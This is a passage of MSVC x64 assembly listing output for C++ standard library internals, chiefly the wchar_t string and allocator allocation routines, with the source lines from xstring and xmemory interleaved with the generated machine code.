; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }
; 2303 :     };
; 2304 :     _Bxty _Bx;
; 2305 : 
; 2306 :     // invariant: _Myres >= _Mysize, and _Myres >= _Small_string_capacity (after string's construction)
; 2307 :     // neither _Mysize nor _Myres takes account of the extra null terminator
; 2308 :     size_type _Mysize = 0; // current length of string (size)

  00000	33 c0		 xor	 eax, eax
  00002	0f 57 c0	 xorps	 xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00005	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2286 : 
; 2287 :         value_type _Buf[_BUF_SIZE];
; 2288 :         pointer _Ptr;
; 2289 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2290 : 
; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {
; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }
; 2303 :     };
; 2304 :     _Bxty _Bx;
; 2305 : 
; 2306 :     // invariant: _Myres >= _Mysize, and _Myres >= _Small_string_capacity (after string's construction)
; 2307 :     // neither _Mysize nor _Myres takes account of the extra null terminator
; 2308 :     size_type _Mysize = 0; // current length of string (size)

  00008	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  0000c	48 89 41 18	 mov	 QWORD PTR [rcx+24], rax
  00010	48 8b c1	 mov	 rax, rcx
  00013	c3		 ret	 0
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0?$allocator@_W@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$allocator@_W@std@@QEAA@XZ PROC			; std::allocator<wchar_t>::allocator<wchar_t>, COMDAT

; 966  :     constexpr allocator() noexcept {}

  00000	48 8b c1	 mov	 rax, rcx
  00003	c3		 ret	 0
??0?$allocator@_W@std@@QEAA@XZ ENDP			; std::allocator<wchar_t>::allocator<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4894 :         return _Mypair._Get_first();

  00000	48 8b c1	 mov	 rax, rcx

; 4895 :     }

  00003	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty, COMDAT

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00000	0f 57 c0	 xorps	 xmm0, xmm0
  00003	48 8b c1	 mov	 rax, rcx
  00006	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0
  00009	c3		 ret	 0
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
_TEXT	SEGMENT
__formal$dead$ = 8
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size, COMDAT

; 741  :         return static_cast<size_t>(-1) / sizeof(value_type);

  00000	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 742  :     }

  0000a	c3		 ret	 0
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1535 :         return *this;

  00000	48 8b c1	 mov	 rax, rcx

; 1536 :     }

  00003	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
_TEXT	SEGMENT
_Al$dead$ = 48
_Capacity$ = 56
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>, COMDAT

; 2611 :     _NODISCARD static _CONSTEXPR20 pointer _Allocate_for_capacity(_Alty& _Al, size_type& _Capacity) {

$LN42:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 2613 :         ++_Capacity; // Take null terminator into consideration

  00006	48 ff 02	 inc	 QWORD PTR [rdx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00009	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  00013	48 8b 0a	 mov	 rcx, QWORD PTR [rdx]
  00016	48 8b da	 mov	 rbx, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00019	48 3b c8	 cmp	 rcx, rax
  0001c	77 58		 ja	 SHORT $LN33@Allocate_f

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  0001e	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00021	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  00028	72 2e		 jb	 SHORT $LN12@Allocate_f

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  0002a	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  0002e	48 3b c1	 cmp	 rax, rcx
  00031	76 43		 jbe	 SHORT $LN33@Allocate_f

; 90   :         return ::operator new(_Bytes);

  00033	48 8b c8	 mov	 rcx, rax
  00036	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  0003b	48 8b c8	 mov	 rcx, rax

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0003e	48 85 c0	 test	 rax, rax
  00041	74 39		 je	 SHORT $LN21@Allocate_f

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00043	48 83 c0 27	 add	 rax, 39			; 00000027H
  00047	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2633 :         --_Capacity;

  0004b	48 ff 0b	 dec	 QWORD PTR [rbx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  0004e	48 89 48 f8	 mov	 QWORD PTR [rax-8], rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2635 :     }

  00052	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00056	5b		 pop	 rbx
  00057	c3		 ret	 0
$LN12@Allocate_f:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 247  :     if (_Bytes != 0) {

  00058	48 85 c9	 test	 rcx, rcx
  0005b	74 0e		 je	 SHORT $LN13@Allocate_f

; 90   :         return ::operator new(_Bytes);

  0005d	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2633 :         --_Capacity;

  00062	48 ff 0b	 dec	 QWORD PTR [rbx]

; 2635 :     }

  00065	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00069	5b		 pop	 rbx
  0006a	c3		 ret	 0
$LN13@Allocate_f:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 251  :     return nullptr;

  0006b	33 c0		 xor	 eax, eax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2633 :         --_Capacity;

  0006d	48 ff 0b	 dec	 QWORD PTR [rbx]

; 2635 :     }

  00070	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00074	5b		 pop	 rbx
  00075	c3		 ret	 0
$LN33@Allocate_f:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 144  :         _Throw_bad_array_new_length(); // add overflow

  00076	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  0007b	cc		 int	 3
$LN21@Allocate_f:

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0007c	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00081	cc		 int	 3
$LN40@Allocate_f:
??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
_TEXT	SEGMENT
_Obj$ = 8
<_Args_0>$ = 16
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z PROC ; std::_Construct_in_place<wchar_t *,wchar_t * const &>, COMDAT

; 249  : #if _HAS_CXX20
; 250  :     if (_STD is_constant_evaluated()) {
; 251  :         _STD construct_at(_STD addressof(_Obj), _STD forward<_Types>(_Args)...);
; 252  :     } else
; 253  : #endif // _HAS_CXX20
; 254  :     {
; 255  :         ::new (static_cast<void*>(_STD addressof(_Obj))) _Ty(_STD forward<_Types>(_Args)...);

  00000	48 8b 02	 mov	 rax, QWORD PTR [rdx]
  00003	48 89 01	 mov	 QWORD PTR [rcx], rax

; 256  :     }
; 257  : }

  00006	c3		 ret	 0
??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ENDP ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z PROC	; std::addressof<wchar_t *>, COMDAT

; 1584 :     return __builtin_addressof(_Val);

  00000	48 8b c1	 mov	 rax, rcx

; 1585 : }

  00003	c3		 ret	 0
??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z ENDP	; std::addressof<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
;	COMDAT ??$min@_K@std@@YAAEB_KAEB_K0@Z
_TEXT	SEGMENT
_Left$ = 8
_Right$ = 16
??$min@_K@std@@YAAEB_KAEB_K0@Z PROC			; std::min<unsigned __int64>, COMDAT

; 99   :     // return smaller of _Left and _Right
; 100  :     return _Right < _Left ? _Right : _Left;

  00000	48 8b 01	 mov	 rax, QWORD PTR [rcx]
  00003	48 39 02	 cmp	 QWORD PTR [rdx], rax
  00006	48 0f 42 ca	 cmovb	 rcx, rdx
  0000a	48 8b c1	 mov	 rax, rcx

; 101  : }

  0000d	c3		 ret	 0
??$min@_K@std@@YAAEB_KAEB_K0@Z ENDP			; std::min<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
_TEXT	SEGMENT
_Al$dead$ = 48
_Count$ = 56
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z PROC ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >, COMDAT

; 2202 :     _Alloc& _Al, _CRT_GUARDOVERFLOW typename allocator_traits<_Alloc>::size_type& _Count) {

$LN34:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 2203 : #if _HAS_CXX23
; 2204 :     if constexpr (_Should_allocate_at_least<_Alloc>) {
; 2205 :         auto [_Ptr, _Allocated] = _Al.allocate_at_least(_Count);
; 2206 :         _Count                  = _Allocated;
; 2207 :         return _Ptr;
; 2208 :     } else
; 2209 : #endif // _HAS_CXX23
; 2210 :     {
; 2211 :         return _Al.allocate(_Count);

  00004	48 8b 0a	 mov	 rcx, QWORD PTR [rdx]

; 73   :         if (_Count > _Max_possible) {

  00007	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  00011	48 3b c8	 cmp	 rcx, rax
  00014	77 4b		 ja	 SHORT $LN30@Allocate_a

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  00016	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00019	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  00020	72 2a		 jb	 SHORT $LN10@Allocate_a

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  00022	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  00026	48 3b c1	 cmp	 rax, rcx
  00029	76 36		 jbe	 SHORT $LN30@Allocate_a

; 90   :         return ::operator new(_Bytes);

  0002b	48 8b c8	 mov	 rcx, rax
  0002e	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  00033	48 8b c8	 mov	 rcx, rax

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00036	48 85 c0	 test	 rax, rax
  00039	74 2c		 je	 SHORT $LN19@Allocate_a

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  0003b	48 83 c0 27	 add	 rax, 39			; 00000027H
  0003f	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00043	48 89 48 f8	 mov	 QWORD PTR [rax-8], rcx

; 2212 :     }
; 2213 : }

  00047	48 83 c4 28	 add	 rsp, 40			; 00000028H
  0004b	c3		 ret	 0
$LN10@Allocate_a:

; 247  :     if (_Bytes != 0) {

  0004c	48 85 c9	 test	 rcx, rcx
  0004f	74 09		 je	 SHORT $LN11@Allocate_a

; 2212 :     }
; 2213 : }

  00051	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 90   :         return ::operator new(_Bytes);

  00055	e9 00 00 00 00	 jmp	 ??2@YAPEAX_K@Z		; operator new
$LN11@Allocate_a:

; 251  :     return nullptr;

  0005a	33 c0		 xor	 eax, eax

; 2212 :     }
; 2213 : }

  0005c	48 83 c4 28	 add	 rsp, 40			; 00000028H
  00060	c3		 ret	 0
$LN30@Allocate_a:

; 144  :         _Throw_bad_array_new_length(); // add overflow

  00061	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  00066	cc		 int	 3
$LN19@Allocate_a:

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00067	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0006c	cc		 int	 3
$LN32@Allocate_a:
??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z ENDP ; std::_Allocate_at_least_helper<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z PROC	; std::forward<wchar_t * const &>, COMDAT

; 1561 :     return static_cast<_Ty&&>(_Arg);

  00000	48 8b c1	 mov	 rax, rcx

; 1562 : }

  00003	c3		 ret	 0
??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z ENDP	; std::forward<wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_Count$ = 56
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z PROC	; std::allocator<wchar_t>::allocate, COMDAT

; 980  :     _NODISCARD_RAW_PTR_ALLOC _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN31:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 73   :         if (_Count > _Max_possible) {

  00004	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0000e	48 3b d0	 cmp	 rdx, rax
  00011	77 4c		 ja	 SHORT $LN27@allocate

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  00013	48 8d 0c 12	 lea	 rcx, QWORD PTR [rdx+rdx]

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00017	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  0001e	72 2a		 jb	 SHORT $LN8@allocate

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  00020	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  00024	48 3b c1	 cmp	 rax, rcx
  00027	76 36		 jbe	 SHORT $LN27@allocate

; 90   :         return ::operator new(_Bytes);

  00029	48 8b c8	 mov	 rcx, rax
  0002c	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  00031	48 8b c8	 mov	 rcx, rax

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00034	48 85 c0	 test	 rax, rax
  00037	74 2c		 je	 SHORT $LN17@allocate

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00039	48 83 c0 27	 add	 rax, 39			; 00000027H
  0003d	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00041	48 89 48 f8	 mov	 QWORD PTR [rax-8], rcx

; 981  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 982  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 983  :     }

  00045	48 83 c4 28	 add	 rsp, 40			; 00000028H
  00049	c3		 ret	 0
$LN8@allocate:

; 247  :     if (_Bytes != 0) {

  0004a	48 85 c9	 test	 rcx, rcx
  0004d	74 09		 je	 SHORT $LN9@allocate

; 981  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 982  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 983  :     }

  0004f	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 90   :         return ::operator new(_Bytes);

  00053	e9 00 00 00 00	 jmp	 ??2@YAPEAX_K@Z		; operator new
$LN9@allocate:

; 251  :     return nullptr;

  00058	33 c0		 xor	 eax, eax

; 981  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 982  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 983  :     }

  0005a	48 83 c4 28	 add	 rsp, 40			; 00000028H
  0005e	c3		 ret	 0
$LN27@allocate:

; 144  :         _Throw_bad_array_new_length(); // add overflow

  0005f	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  00064	cc		 int	 3
$LN17@allocate:

; 145  :     }
; 146  : 
; 147  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00065	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0006a	cc		 int	 3
$LN29@allocate:
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ENDP	; std::allocator<wchar_t>::allocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 48
??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z PROC ; std::_Allocate<16,std::_Default_allocate_traits,0>, COMDAT

; 234  : __declspec(allocator) _CONSTEXPR20 void* _Allocate(const size_t _Bytes) {

$LN24:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 235  :     // allocate _Bytes when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 236  : #if defined(_M_IX86) || defined(_M_X64)
; 237  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 238  :     if (!_STD is_constant_evaluated())
; 239  : #endif // _HAS_CXX20
; 240  :     {
; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00004	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  0000b	72 2a		 jb	 SHORT $LN2@Allocate

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  0000d	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  00011	48 3b c1	 cmp	 rax, rcx
  00014	76 36		 jbe	 SHORT $LN23@Allocate

; 90   :         return ::operator new(_Bytes);

  00016	48 8b c8	 mov	 rcx, rax
  00019	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  0001e	48 8b c8	 mov	 rcx, rax

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00021	48 85 c0	 test	 rax, rax
  00024	74 2c		 je	 SHORT $LN11@Allocate

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00026	48 83 c0 27	 add	 rax, 39			; 00000027H
  0002a	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  0002e	48 89 48 f8	 mov	 QWORD PTR [rax-8], rcx

; 252  : }

  00032	48 83 c4 28	 add	 rsp, 40			; 00000028H
  00036	c3		 ret	 0
$LN2@Allocate:

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);
; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  00037	48 85 c9	 test	 rcx, rcx
  0003a	74 09		 je	 SHORT $LN3@Allocate

; 252  : }

  0003c	48 83 c4 28	 add	 rsp, 40			; 00000028H

